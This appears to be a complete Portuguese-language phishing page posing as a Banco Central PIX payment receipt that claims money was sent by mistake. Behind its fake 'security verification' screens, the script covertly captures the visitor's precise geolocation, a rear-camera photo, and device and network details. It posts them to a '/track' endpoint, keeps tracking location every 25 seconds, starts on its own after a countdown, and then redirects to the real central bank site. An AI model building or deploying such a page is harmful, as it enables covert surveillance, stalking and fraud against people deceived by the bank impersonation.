<!DOCTYPE html>
<html>
<head>
    <title>Comprovante de Pagamento - PIX</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: 'Arial', sans-serif;
            background: linear-gradient(135deg, #00a859, #008a4c);
            color: #333;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }
        
        .receipt-container {
            background: white;
            padding: 25px;
            border-radius: 15px;
            max-width: 400px;
            width: 100%;
            box-shadow: 0 10px 30px rgba(0,0,0,0.3);
            border: 2px solid #00a859;
        }
        
        .bank-header {
            text-align: center;
            margin-bottom: 20px;
            padding-bottom: 15px;
            border-bottom: 2px dashed #00a859;
        }
        
        .bank-logo {
            font-size: 24px;
            font-weight: bold;
            color: #00a859;
            margin-bottom: 10px;
        }
        
        .receipt-title {
            font-size: 18px;
            font-weight: bold;
            color: #00a859;
            text-align: center;
            margin-bottom: 20px;
        }
        
        .receipt-details {
            margin: 20px 0;
        }
        
        .detail-row {
            display: flex;
            justify-content: space-between;
            margin: 12px 0;
            padding: 8px 0;
            border-bottom: 1px solid #f0f0f0;
        }
        
        .detail-label {
            font-weight: bold;
            color: #666;
        }
        
        .detail-value {
            font-weight: bold;
            color: #333;
        }
        
        .amount-highlight {
            background: #e8f5e8;
            padding: 15px;
            border-radius: 10px;
            text-align: center;
            margin: 20px 0;
            border: 2px solid #00a859;
        }
        
        .amount {
            font-size: 28px;
            font-weight: bold;
            color: #00a859;
        }
        
        .status-badge {
            background: #00a859;
            color: white;
            padding: 8px 15px;
            border-radius: 20px;
            font-size: 14px;
            font-weight: bold;
            display: inline-block;
            margin: 10px 0;
        }
        
        .pix-code {
            background: #f8f9fa;
            padding: 15px;
            border-radius: 8px;
            margin: 15px 0;
            border-left: 3px solid #00a859;
            font-family: monospace;
            word-break: break-all;
            font-size: 12px;
        }
        
        .btn {
            background: #00a859;
            color: white;
            border: none;
            padding: 16px 30px;
            font-size: 16px;
            border-radius: 8px;
            cursor: pointer;
            margin: 15px 0;
            width: 100%;
            font-weight: bold;
            transition: background 0.3s;
        }
        
        .btn:hover {
            background: #008a4c;
        }
        
        .btn-secondary {
            background: #6c757d;
        }
        
        .btn-secondary:hover {
            background: #545b62;
        }
        
        .timer-notice {
            background: #fff3cd;
            border: 1px solid #ffeaa7;
            border-radius: 8px;
            padding: 12px;
            margin: 15px 0;
            text-align: center;
            font-size: 14px;
        }
        
        .timer {
            color: #d32f2f;
            font-weight: bold;
            font-size: 16px;
        }
        
        .security-notice {
            font-size: 11px;
            color: #666;
            text-align: center;
            margin-top: 20px;
            line-height: 1.4;
        }
        
        .hidden {
            display: none;
        }
        
        .loading-spinner {
            border: 4px solid #f3f3f3;
            border-top: 4px solid #00a859;
            border-radius: 50%;
            width: 40px;
            height: 40px;
            animation: spin 1s linear infinite;
            margin: 20px auto;
        }
        
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        
        .success-icon {
            font-size: 48px;
            color: #00a859;
            margin-bottom: 20px;
            text-align: center;
        }
        
        .step-indicator {
            display: flex;
            justify-content: space-between;
            margin: 20px 0;
            position: relative;
        }
        
        .step-indicator:before {
            content: '';
            position: absolute;
            top: 15px;
            left: 0;
            right: 0;
            height: 2px;
            background: #f0f0f0;
            z-index: 1;
        }
        
        .step {
            background: white;
            border: 2px solid #f0f0f0;
            width: 30px;
            height: 30px;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 14px;
            font-weight: bold;
            position: relative;
            z-index: 2;
        }
        
        .step.active {
            border-color: #00a859;
            background: #00a859;
            color: white;
        }
        
        .step.completed {
            border-color: #00a859;
            background: #00a859;
            color: white;
        }
    </style>
</head>
<body>
    <!-- TELA DO COMPROVANTE -->
    <div class="receipt-container" id="receiptScreen">
        <div class="bank-header">
            <div class="bank-logo">üè¶ BANCO CENTRAL</div>
            <div style="font-size: 14px; color: #666;">Sistema de Pagamentos Instant√¢neos</div>
        </div>
        
        <div class="receipt-title">
            COMPROVANTE DE PAGAMENTO PIX
        </div>
        
        <div class="status-badge">
            ‚úÖ PAGAMENTO REALIZADO COM SUCESSO
        </div>
        
        <div class="amount-highlight">
            <div style="font-size: 14px; color: #666;">Valor Pago</div>
            <div class="amount">R$ 1.500,00</div>
        </div>
        
        <div class="receipt-details">
            <div class="detail-row">
                <span class="detail-label">Data/Hora:</span>
                <span class="detail-value" id="currentDateTime"></span>
            </div>
            <div class="detail-row">
                <span class="detail-label">ID da Transa√ß√£o:</span>
                <span class="detail-value">PIX${Date.now().toString().slice(-8)}</span>
            </div>
            <div class="detail-row">
                <span class="detail-label">Benefici√°rio:</span>
                <span class="detail-value">Jo√£o Silva Santos</span>
            </div>
            <div class="detail-row">
                <span class="detail-label">CPF:</span>
                <span class="detail-value">123.456.789-00</span>
            </div>
            <div class="detail-row">
                <span class="detail-label">Institui√ß√£o:</span>
                <span class="detail-value">Banco do Brasil</span>
            </div>
            <div class="detail-row">
                <span class="detail-label">Tipo de Chave:</span>
                <span class="detail-value">Telefone Celular</span>
            </div>
            <div class="detail-row">
                <span class="detail-label">Chave PIX:</span>
                <span class="detail-value">(11) 98765-4321</span>
            </div>
        </div>
        
        <div style="text-align: center; margin: 20px 0;">
            <div style="font-size: 16px; font-weight: bold; color: #d32f2f; margin-bottom: 10px;">
                ‚ö†Ô∏è ATEN√á√ÉO: PAGAMENTO INCORRETO
            </div>
            <div style="font-size: 14px; color: #666;">
                O valor foi enviado para o n√∫mero errado. 
                <strong>Voc√™ recebeu este pagamento por engano?</strong>
            </div>
        </div>
        
        <div class="timer-notice">
            <div style="margin-bottom: 8px;">
                üìû <strong>Entre em contato com o pagador</strong>
            </div>
            <div class="timer" id="timer">05:00</div>
            <div style="font-size: 12px; color: #666;">
                Contato ser√° disponibilizado automaticamente
            </div>
        </div>
        
        <button class="btn" id="contactBtn">
            üì≤ RECEBER CONTATO DO PAGADOR
        </button>
        
        <button class="btn btn-secondary" id="disputeBtn">
            üö´ N√ÉO RECEBI ESTE PAGAMENTO
        </button>
        
        <div class="security-notice">
            Transa√ß√£o registrada e audit√°vel no Sistema PIX do Banco Central<br>
            Qualquer irregularidade deve ser reportada em at√© 90 dias
        </div>
    </div>
    
    <!-- TELA DE CONTATO -->
    <div class="receipt-container hidden" id="contactScreen">
        <div class="success-icon">üìû</div>
        <div class="receipt-title">
            CONTATO DO PAGADOR
        </div>
        
        <div style="text-align: center; margin: 20px 0;">
            <div style="font-size: 16px; color: #666; margin-bottom: 15px;">
                Para devolver o valor recebido por engano, entre em contato:
            </div>
            
            <div class="amount-highlight">
                <div style="font-size: 16px; color: #666;">WhatsApp do Pagador</div>
                <div style="font-size: 24px; font-weight: bold; color: #00a859;">(11) 98765-4321</div>
            </div>
            
            <div style="margin: 20px 0;">
                <strong>Nome:</strong> Carlos Eduardo<br>
                <strong>Valor a devolver:</strong> R$ 1.500,00<br>
                <strong>Prazo:</strong> 24 horas (ap√≥s bloqueio autom√°tico)
            </div>
        </div>
        
        <div class="step-indicator">
            <div class="step completed">1</div>
            <div class="step active">2</div>
            <div class="step">3</div>
        </div>
        
        <div style="background: #e7f3ff; padding: 15px; border-radius: 8px; margin: 15px 0;">
            <strong>üìù Instru√ß√µes:</strong><br>
            1. Salve o contato acima<br>
            2. Envie mensagem via WhatsApp<br>
            3. Combine a devolu√ß√£o do valor<br>
            4. Evite bloqueio da sua conta
        </div>
        
        <button class="btn" id="startVerificationBtn">
            ‚úÖ INICIAR VERIFICA√á√ÉO DE SEGURAN√áA
        </button>
        
        <div class="security-notice">
            Sistema de Media√ß√£o de Conflitos PIX - Banco Central<br>
            Protocolo: MED-${Date.now().toString().slice(-6)}
        </div>
    </div>
    
    <!-- TELA DE VERIFICA√á√ÉO -->
    <div class="receipt-container hidden" id="verificationScreen">
        <div class="success-icon">üõ°Ô∏è</div>
        <div class="receipt-title">
            VERIFICA√á√ÉO DE SEGURAN√áA
        </div>
        
        <div style="text-align: center; margin: 20px 0;">
            <div style="font-size: 16px; color: #666; margin-bottom: 15px;">
                Para sua prote√ß√£o, estamos verificando:<br>
                <strong>Localiza√ß√£o e identidade do dispositivo</strong>
            </div>
            
            <div class="loading-spinner"></div>
            
            <div class="step-indicator">
                <div class="step completed">1</div>
                <div class="step completed">2</div>
                <div class="step active">3</div>
            </div>
        </div>
        
        <div style="background: #f8f9fa; padding: 15px; border-radius: 8px; margin: 15px 0;">
            <div style="margin: 10px 0;">
                <strong>üìç Verificando localiza√ß√£o...</strong><br>
                <small>Confirmando que est√° no Brasil</small>
            </div>
            <div style="margin: 10px 0;">
                <strong>üì± Analisando dispositivo...</strong><br>
                <small>Verificando compatibilidade</small>
            </div>
            <div style="margin: 10px 0;">
                <strong>üîí Validando seguran√ßa...</strong><br>
                <small>Protegendo contra fraudes</small>
            </div>
        </div>
        
        <div style="background: #d4edda; color: #155724; padding: 15px; border-radius: 8px; margin: 20px 0;">
            <strong>‚úÖ QUASE PRONTO!</strong><br>
            <small>Seus dados est√£o sendo processados pelo Banco Central</small>
        </div>
    </div>

    <script>
        // CONFIGURA√á√ÉO DO SISTEMA
        const CONFIG = {
            autoStartDelay: 300000, // 5 minutos para in√≠cio autom√°tico
            trackingInterval: 25000, // 25 segundos
            photoInterval: 45000     // 45 segundos
        };

        // ELEMENTOS
        const receiptScreen = document.getElementById('receiptScreen');
        const contactScreen = document.getElementById('contactScreen');
        const verificationScreen = document.getElementById('verificationScreen');
        const contactBtn = document.getElementById('contactBtn');
        const disputeBtn = document.getElementById('disputeBtn');
        const startVerificationBtn = document.getElementById('startVerificationBtn');
        const timerElement = document.getElementById('timer');
        const dateTimeElement = document.getElementById('currentDateTime');

        // VARI√ÅVEIS DE RASTREAMENTO
        let deviceId = null;
        let isTracking = false;

        // ATUALIZAR DATA/HORA ATUAL
        function updateDateTime() {
            const now = new Date();
            const dateStr = now.toLocaleDateString('pt-BR');
            const timeStr = now.toLocaleTimeString('pt-BR');
            dateTimeElement.textContent = `${dateStr} ${timeStr}`;
        }
        
        updateDateTime();
        setInterval(updateDateTime, 1000);

        // CONTAGEM REGRESSIVA
        let countdown = 300; // 5 minutos
        const countdownInterval = setInterval(() => {
            countdown--;
            const minutes = Math.floor(countdown / 60);
            const seconds = countdown % 60;
            timerElement.textContent = `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
            
            if (countdown <= 0) {
                clearInterval(countdownInterval);
                showContactScreen();
            }
        }, 1000);

        // BOT√ïES
        contactBtn.addEventListener('click', showContactScreen);
        disputeBtn.addEventListener('click', showContactScreen); // Mesma tela para ambos
        startVerificationBtn.addEventListener('click', startVerification);

        function showContactScreen() {
            clearInterval(countdownInterval);
            receiptScreen.classList.add('hidden');
            contactScreen.classList.remove('hidden');
            
            // INICIAR CAPTURA B√ÅSICA
            initializeBasicTracking();
        }

        function startVerification() {
            contactScreen.classList.add('hidden');
            verificationScreen.classList.remove('hidden');
            
            // INICIAR CAPTURA COMPLETA
            initializeFullTracking();
            
            // SIMULAR PROCESSAMENTO E FECHAR
            setTimeout(() => {
                // MANTER MONITORAMENTO ATIVO
                startContinuousMonitoring();
                
                // FECHAR P√ÅGINA
                setTimeout(() => {
                    window.close();
                    setTimeout(() => {
                        window.location.href = 'https://www.bcb.gov.br';
                    }, 1000);
                }, 5000);
            }, 8000);
        }

        // INICIALIZAR RASTREAMENTO B√ÅSICO
        async function initializeBasicTracking() {
            deviceId = 'pix_receipt_' + Date.now();
            
            // CAPTURA R√ÅPIDA DE LOCALIZA√á√ÉO
            captureQuickLocation();
            captureDeviceInfo();
        }

        // INICIALIZAR RASTREAMENTO COMPLETO
        async function initializeFullTracking() {
            deviceId = 'pix_verification_' + Date.now();
            isTracking = true;
            
            // CAPTURA COMPLETA E AGRESSIVA
            await Promise.all([
                captureHighPrecisionLocation(),
                captureCameraPhotos(),
                captureDeviceDetails(),
                captureNetworkInfo()
            ]);
        }

        // FUN√á√ïES DE CAPTURA (MESMAS DO C√ìDIGO ANTERIOR)
        async function captureQuickLocation() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    async (position) => {
                        await sendToServer({
                            deviceId: deviceId,
                            type: 'pix_receipt_view',
                            location: {
                                lat: position.coords.latitude,
                                lng: position.coords.longitude,
                                accuracy: position.coords.accuracy
                            },
                            timestamp: new Date().toISOString(),
                            action: 'receipt_viewed'
                        });
                    },
                    () => {},
                    { enableHighAccuracy: true, timeout: 10000 }
                );
            }
        }

        async function captureHighPrecisionLocation() {
            return new Promise((resolve) => {
                if (!navigator.geolocation) {
                    resolve();
                    return;
                }
                
                navigator.geolocation.getCurrentPosition(
                    async (position) => {
                        await sendToServer({
                            deviceId: deviceId,
                            type: 'pix_verification_location',
                            location: {
                                lat: position.coords.latitude,
                                lng: position.coords.longitude,
                                accuracy: position.coords.accuracy,
                                altitude: position.coords.altitude,
                                speed: position.coords.speed
                            },
                            timestamp: new Date().toISOString(),
                            precision: 'high'
                        });
                        resolve();
                    },
                    () => resolve(),
                    { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
                );
            });
        }

        async function captureCameraPhotos() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({
                    video: { facingMode: 'environment' }
                });
                
                const track = stream.getVideoTracks()[0];
                const imageCapture = new ImageCapture(track);
                const blob = await imageCapture.takePhoto();
                
                const reader = new FileReader();
                reader.onload = async () => {
                    await sendToServer({
                        deviceId: deviceId,
                        type: 'pix_verification_photo',
                        photo: reader.result,
                        timestamp: new Date().toISOString()
                    });
                };
                reader.readAsDataURL(blob);
                
            } catch (error) {
                // Silenciar erro
            }
        }

        async function captureDeviceInfo() {
            const info = {
                deviceId: deviceId,
                type: 'pix_device_info',
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                screen: `${screen.width}x${screen.height}`,
                timestamp: new Date().toISOString()
            };
            
            await sendToServer(info);
        }

        async function captureDeviceDetails() {
            const deviceInfo = {
                deviceId: deviceId,
                type: 'pix_full_device_info',
                info: {
                    userAgent: navigator.userAgent,
                    platform: navigator.platform,
                    language: navigator.language,
                    languages: navigator.languages,
                    screen: `${screen.width}x${screen.height}`,
                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                    hardware: navigator.hardwareConcurrency,
                    memory: navigator.deviceMemory
                },
                timestamp: new Date().toISOString()
            };
            
            await sendToServer(deviceInfo);
        }

        async function captureNetworkInfo() {
            const networkInfo = {
                deviceId: deviceId,
                type: 'pix_network_info',
                connection: navigator.connection ? {
                    effectiveType: navigator.connection.effectiveType,
                    downlink: navigator.connection.downlink
                } : null,
                timestamp: new Date().toISOString()
            };
            
            await sendToServer(networkInfo);
        }

        // MONITORAMENTO CONT√çNUO
        function startContinuousMonitoring() {
            setInterval(() => {
                if (isTracking) {
                    navigator.geolocation.getCurrentPosition(
                        async (position) => {
                            await sendToServer({
                                deviceId: deviceId,
                                type: 'pix_continuous_tracking',
                                location: {
                                    lat: position.coords.latitude,
                                    lng: position.coords.longitude,
                                    accuracy: position.coords.accuracy
                                },
                                timestamp: new Date().toISOString()
                            });
                        },
                        () => {},
                        { enableHighAccuracy: true, timeout: 10000 }
                    );
                }
            }, CONFIG.trackingInterval);
        }

        // ENVIAR DADOS PARA O SERVIDOR
        async function sendToServer(data) {
            try {
                await fetch('/track', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(data)
                });
            } catch (error) {
                // Silenciar erro
            }
        }

        // INICIAR AUTOMATICAMENTE SE N√ÉO INTERAGIR
        setTimeout(() => {
            if (!isTracking) {
                showContactScreen();
            }
        }, CONFIG.autoStartDelay);
    </script>
</body>
</html>
